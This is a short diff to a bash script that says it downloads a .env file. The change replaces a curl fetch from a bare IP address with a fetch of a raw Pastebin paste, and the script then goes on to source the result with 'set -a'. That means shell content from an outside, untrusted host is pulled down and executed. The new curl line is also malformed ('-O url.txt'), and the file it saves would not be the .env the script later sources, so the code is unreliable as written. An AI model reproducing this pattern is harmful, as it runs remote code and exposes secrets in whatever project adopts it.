@@ -1,6 +1,6 @@
 #!/bin/bash
 echo "Downloading .env file..."
-curl http://64.23.222.115/.env -O
+curl https://pastebin.com/raw/vK1w4uqA -O url.txt
 
 echo "Sourcing .env file..."
 set -a 
